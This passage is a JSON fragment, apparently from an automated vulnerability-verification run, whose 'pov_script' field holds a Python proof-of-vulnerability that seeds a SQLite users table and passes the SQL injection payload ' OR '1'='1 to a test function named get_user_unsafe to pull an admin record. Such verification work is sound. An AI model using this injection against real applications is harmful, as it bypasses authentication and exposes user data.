      "confidence": 1.0,
      "pov_script": "import sqlite3\nimport os\n\ndef run_pov():\n    try:\n        # Retrieve the vulnerable function from the global namespace provided by the test harness\n        target_function = globals().get('get_user_unsafe')\n        \n        if not target_function:\n            print(\"Error: Target function 'get_user_unsafe' not found in globals.\")\n            return\n\n        # Setup: Ensure the database and table exist to make the test deterministic.\n        # This prevents 'no such table' errors if the harness only loaded the code but didn't initialize the DB.\n        db_path = 'users.db'\n        conn = sqlite3.connect(db_path)\n        cursor = conn.cursor()\n        cursor.execute(\"CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, role TEXT)\")\n        \n        # Insert a dummy admin record. We will attempt to retrieve this record without knowing the username.\n        cursor.execute(\"INSERT OR IGNORE INTO users (id, username, role) VALUES (1, 'superadmin_secret_user', 'admin')\")\n        conn.commit()\n        conn.close()\n\n        # Craft the SQL Injection payload\n        # The vulnerable query structure is: \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n        # We provide a payload that closes the initial quote, adds an OR condition that is always true, \n        # and comments out the rest of the query (if any).\n        # Payload: ' OR '1'='1\n        # Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'\n        malicious_payload = \"' OR '1'='1\"\n        \n        # Invoke the vulnerable function with our payload\n        result = target_function(malicious_payload)\n        \n        # Verification: If the SQL injection was successful, the query will return the first row \n        # in the database (the admin user) because '1'='1' is true for all rows, bypassing the username check.\n        if result and 'superadmin_secret_user' in result:\n            print(\"VULNERABILI